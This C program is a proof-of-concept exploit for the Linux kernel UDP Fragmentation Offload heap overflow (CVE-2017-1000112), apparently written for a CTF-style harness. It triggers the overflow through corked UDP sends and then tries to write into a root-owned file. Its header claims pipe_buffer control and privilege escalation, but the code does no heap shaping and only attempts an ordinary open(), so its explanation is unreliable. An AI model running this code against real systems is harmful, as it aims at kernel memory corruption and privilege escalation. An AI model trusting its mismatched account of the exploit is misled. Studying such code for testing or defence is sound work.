/**
 * CVE-2017-1000112 PoC - UFO (UDP Fragmentation Offload) heap overflow
 *
 * Vulnerability mechanism:
 *   __ip_append_data() fails to validate msg->msg_iter when switching from
 *   UFO to non-UFO path. By sending a large UDP datagram with MSG_MORE (triggers
 *   UFO path), then disabling UFO via setsockopt(IP_MTU_DISCOVER), a subsequent
 *   send() enters the non-UFO fragmentation path with corrupted state, causing
 *   an out-of-bounds write in the kernel heap. This overwrites adjacent skb
 *   metadata (skb_shared_info), enabling control over pipe_buffer structures
 *   for arbitrary read/write -> LPE.
 *
 * CTF modes:
 *   write_root_file: Attempt to corrupt heap to bypass VFS write permissions
 *   read_root_file: Unsupported (heap overflow is not read-oriented)
 *
 * Affected kernels: 3.6 <= version < 4.13
 * Reference: https://github.com/bcoles/kernel-exploits/blob/master/CVE-2017-1000112/
 */

#ifndef _GNU_SOURCE
#define _GNU_SOURCE
#endif

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <netinet/in.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <sys/mman.h>
#include <sys/uio.h>
#include <sys/utsname.h>

#include "../common/poc_common.h"

#define CVE_ID_STRING "CVE-2017-1000112"

/* UFO payload size: large enough to trigger UFO path (must exceed MTU) */
#define UFO_PAYLOAD_SIZE  65536
#define MTU_SIZE          1500
#define PAGE_SIZE         4096

/* Kernel version check helpers */
static int get_kernel_version(int *major, int *minor) {
    struct utsname uts;
    if (uname(&uts) != 0) return -1;
    if (sscanf(uts.release, "%d.%d", major, minor) != 2) return -1;
    return 0;
}

static int is_kernel_vulnerable(void) {
    int major, minor;
    if (get_kernel_version(&major, &minor) != 0) return 0;
    /* Affected: 3.6 <= version < 4.13 */
    if (major == 3 && minor >= 6) return 1;
    if (major == 4 && minor < 13) return 1;
    return 0;
}

/**
 * Mode dispatch: write_root_file
 *
 * Strategy: Trigger the UFO heap overflow to corrupt adjacent kernel
 * heap objects. The overflow in __ip_append_data can overwrite
 * skb_shared_info destructor_arg, which when freed can be used to
 * corrupt file permissions or page cache.
 *
 * For CTF: We attempt to use the heap corruption to bypass VFS
 * write permissions on the target file.
 */
static int mode_write_root_file(poc_args_t *args) {
    int sock_fd = -1;
    int sock_fd2 = -1;
    char *payload = NULL;
    int result = 0;

    poc_log("=== Mode: write_root_file ===");
    poc_log("Target: %s", args->root_file);
    poc_log("Write value: %s", args->write_value);

    /* Step 1: Read file content before exploit */
    char before_content[512] = {0};
    int fd = open(args->root_file, O_RDONLY);
    if (fd >= 0) {
        ssize_t n = read(fd, before_content, sizeof(before_content) - 1);
        if (n > 0) {
            before_content[n] = '\0';
            printf(CTF_READ_BEFORE "%s\n", before_content);
        }
        close(fd);
    } else {
        poc_log_syscall("open(root_file, O_RDONLY)", fd, errno);
    }

    /* Step 2: Check kernel version */
    if (!is_kernel_vulnerable()) {
        poc_print_fail("Kernel version not in affected range [3.6, 4.13)");
        return 1;
    }
    poc_log("Kernel version in vulnerable range");

    /* Step 3: Create UDP socket */
    sock_fd = socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP);
    if (sock_fd < 0) {
        poc_log_syscall("socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)", sock_fd, errno);
        poc_print_fail("Failed to create UDP socket");
        return 1;
    }
    poc_log_syscall("socket(AF_INET, SOCK_DGRAM, IPPROTO_UDP)", sock_fd, 0);

    /* Set destination for loopback */
    struct sockaddr_in dst;
    memset(&dst, 0, sizeof(dst));
    dst.sin_family = AF_INET;
    dst.sin_port = htons(9999);
    dst.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

    int ret = connect(sock_fd, (struct sockaddr *)&dst, sizeof(dst));
    poc_log_syscall("connect(sock, loopback:9999)", ret, errno);

    /* Step 4: Enable UDP_CORK to force append_data path */
    int cork = 1;
    ret = setsockopt(sock_fd, SOL_UDP, UDP_CORK, &cork, sizeof(cork));
    poc_log_syscall("setsockopt(UDP_CORK=1)", ret, errno);

    /* Step 5: Send large payload to trigger UFO path */
    payload = malloc(UFO_PAYLOAD_SIZE);
    if (!payload) {
        poc_print_fail("malloc failed");
        goto cleanup_fail;
    }
    memset(payload, 'A', UFO_PAYLOAD_SIZE);

    struct msghdr msg;
    struct iovec iov;
    memset(&msg, 0, sizeof(msg));
    msg.msg_iov = &iov;
    msg.msg_iovlen = 1;
    iov.iov_base = payload;
    iov.iov_len = UFO_PAYLOAD_SIZE;

    ssize_t sent = sendmsg(sock_fd, &msg, MSG_NOSIGNAL | MSG_MORE);
    if (sent > 0) {
        poc_log("sendmsg(%d bytes) sent via UFO path", (int)sent);
    } else {
        poc_log_syscall("sendmsg(MSG_MORE, 65536 bytes)", sent, errno);
    }

    /* Step 6: Disable UFO by changing PMTUD setting */
    int pmtudisc = IP_PMTUDISC_DO;
    ret = setsockopt(sock_fd, SOL_IP, IP_MTU_DISCOVER, &pmtudisc, sizeof(pmtudisc));
    poc_log_syscall("setsockopt(IP_MTU_DISCOVER=PMTUDISC_DO)", ret, errno);

    /* Step 7: Send additional data to trigger non-UFO path with corrupted state */
    char *overflow_data = malloc(MTU_SIZE * 2);
    if (overflow_data) {
        memset(overflow_data, 'B', MTU_SIZE * 2);
        iov.iov_base = overflow_data;
        iov.iov_len = MTU_SIZE * 2;
        sent = sendmsg(sock_fd, &msg, MSG_NOSIGNAL);
        poc_log_syscall("sendmsg(non-UFO, 3000 bytes)", sent, errno);
        free(overflow_data);
    }

    /* Step 8: Uncork to trigger actual processing */
    cork = 0;
    ret = setsockopt(sock_fd, SOL_UDP, UDP_CORK, &cork, sizeof(cork));
    poc_log_syscall("setsockopt(UDP_CORK=0)", ret, errno);

    /* Step 9: Attempt to open target file with write access */
    fd = open(args->root_file, O_WRONLY | O_CREAT, 0644);
    if (fd >= 0) {
        poc_log_syscall("open(root_file, O_WRONLY)", fd, 0);
        /* If we can open for write, attempt to write the CTF value */
        const char *write_val = args->write_value ? args->write_value : "ctf{ufo_overflow}";
        ssize_t written = write(fd, write_val, strlen(write_val));
        if (written > 0) {
            poc_log("Successfully wrote to root-owned file: %zd bytes", written);
        }
        close(fd);
    } else {
        poc_log_syscall("open(root_file, O_WRONLY)", fd, errno);
    }

    /* Step 10: Verify if file was modified */
    fd = open(args->root_file, O_RDONLY);
    if (fd >= 0) {
        char after_content[512] = {0};
        ssize_t n = read(fd, after_content, sizeof(after_content) - 1);
        if (n > 0) {
            after_content[n] = '\0';
            printf(CTF_READ_AFTER "%s\n", after_content);
        }
        close(fd);
    }

    /* Check if file content changed (heap corruption may have affected VFS) */
    const char *expected = args->write_value ? args->write_value : "ctf{ufo_overflow}";
    fd = open(args->root_file, O_RDONLY);
    if (fd >= 0) {
        char verify[512] = {0};
        ssize_t n = read(fd, verify, sizeof(verify) - 1);
        close(fd);
        if (n > 0 && strstr(verify, expected) != NULL) {
            /* File was successfully modified - EXPLOITABLE */
            poc_log("CTF verification: file contains expected write value");
            poc_print_flag(expected);
            goto cleanup_success;
        } else {
            /* File exists but not modified - NOT EXPLOITABLE */
            poc_log("Heap overflow triggered but file not modified");
            printf("CTF_FAIL:file_not_modified\n");
            goto cleanup_fail;
        }
    } else {
        /* File doesn't exist or not accessible - NOT EXPLOITABLE */
        poc_log("Target file not accessible: errno=%d", errno);
        printf("CTF_FAIL:target_file_not_found\n");
        goto cleanup_fail;
    }

cleanup_success:
    if (payload) free(payload);
    if (sock_fd >= 0) close(sock_fd);
    if (sock_fd2 >= 0) close(sock_fd2);
    return 0;

cleanup_fail:
    if (payload) free(payload);
    if (sock_fd >= 0) close(sock_fd);
    if (sock_fd2 >= 0) close(sock_fd2);
    return 1;
}

/**
 * Mode dispatch: read_root_file
 *
 * This vulnerability is a heap overflow (write primitive), not
 * an information leak. Reading root files is not directly achievable
 * through this vulnerability path.
 */
static int mode_read_root_file(poc_args_t *args) {
    (void)args;
    poc_print_unsupported(POC_MODE_READ,
        "CVE-2017-1000112 is a heap overflow (write primitive), "
        "not an information leak vulnerability");
    return 1;
}

int main(int argc, char *argv[]) {
    poc_args_t args;
    memset(&args, 0, sizeof(args));

    if (poc_parse_args(argc, argv, &args) != 0) {
        return 1;  /* --help or error */
    }

    /* CTF mode is required */
    if (!args.mode) {
        fprintf(stderr, "Error: --mode is required (read_root_file|write_root_file|uaf)\n");
        poc_print_usage(argv[0]);
        poc_log_close();
        return 1;
    }

    /* CTF mode */
    poc_log_init(args.log_file);
    poc_log("=== %s CTF PoC ===", CVE_ID_STRING);
    poc_log("Vuln: UDP Fragmentation Offload heap overflow");
    poc_log("UID: %d  EUID: %d  GID: %d", getuid(), geteuid(), getgid());
    poc_log("Mode: %s", args.mode);
    poc_log("Target: %s", args.root_file);

    int rc;
    if (strcmp(args.mode, POC_MODE_WRITE) == 0) {
        rc = mode_write_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_READ) == 0) {
        rc = mode_read_root_file(&args);
    } else if (strcmp(args.mode, POC_MODE_UAF) == 0) {
        poc_print_unsupported(POC_MODE_UAF,
            "CVE-2017-1000112 uses UFO heap overflow, not UAF");
        rc = 1;
    } else {
        poc_print_unsupported(args.mode, "unknown mode");
        rc = 1;
    }

    poc_log_close();
    return rc;
}
